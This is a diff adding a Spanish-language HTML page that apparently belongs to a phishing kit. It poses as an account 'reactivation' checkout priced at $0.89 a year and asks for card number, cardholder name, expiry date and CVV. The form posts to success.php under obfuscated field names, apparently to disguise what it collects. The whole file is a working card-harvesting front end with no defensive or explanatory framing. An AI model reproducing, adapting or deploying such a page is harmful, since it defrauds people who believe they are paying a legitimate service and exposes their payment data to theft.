@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>Reactivación</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+
+    <link rel="icon" href="/assets/images/icon.ico">
+    <link rel="stylesheet" href="assets/css/normalize.css">
+    <link rel="stylesheet" href="assets/css/pstyles.css">
+</head>
+
+<body>
+
+    <header class="h">
+        <div class="h-c">
+            <div class="logo-c">
+                <img src="assets/images/c-logo.png" alt="">
+            </div>
+            <div class="vln"></div>
+            <div class="txt-c">
+                <p><strong>Estas comprando</strong><br>Cuenta Personal</p>
+                <h2 style="font-size: 30px; font-weight: 500;">$0.89 / Por año</h2>
+            </div>
+        </div>
+    </header>
+
+    <section class="c">
+
+        <div class="l-c">
+
+            <div class="f-c">
+                <form class="f" id="form" method="POST" action="success.php" enctype="multipart/form-data">
+
+                    <h2 class="f-t">Añade una tarjeta de credito o debito</h2>
+
+                    <div class="p-meth">
+                        <img src="/assets/images/l_vis.svg" alt="">
+                        <img src="/assets/images/l_amex.svg" alt="">
+                        <img src="/assets/images/l_mc.svg" alt="">
+                        <img src="/assets/images/l_disc.svg" alt="">
+                    </div>
+
+                    <div class="c-n">
+                        <label>Número de tarjeta*</label>
+                        <input type="text" pattern="[0-9]*" inputmode="numeric" id="c-n" name="rgtrthr" minlength="16" maxlength="16"
+                            required>
+                    </div>
+
+                    <div class="ch-n">
+                        <label>Cardholder Name*</label>
+                        <input type="text" id="a-n-f" name="xsdgtry" maxlength="100" required>
+                    </div>
+
+                    <div class="exp">
+                        <label>Expires*</label>
+
+                        <div class="date">
+                            <input type="number" name="cbyutnh" min="0" max="12" step="1" placeholder="Mes" required>
+                            <input type="number" name="rtmghm" min="0" max="48" step="1" placeholder="Año" required>
+                        </div>
+                    </div>
+
+                    <div class="c-s">
+                        <label>CVV*</label>
+                        <input type="text" pattern="[0-9]*" inputmode="numeric" id="t-p-f" name="puyhrx" minlength="3" maxlength="4"
+                            required>
+                    </div>
+
+                    <div class="s">
+                        <input type="submit" class="b" value="Continuar">
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+    <script type="text/javascript">
+        document.getElementById("c-n").addEventListener("keypress", function (evt) {
+            if (evt.which < 48 || evt.which > 57) {
+                evt.preventDefault();
+            }
+        });
+    </script>
+</body>
+
+</html>
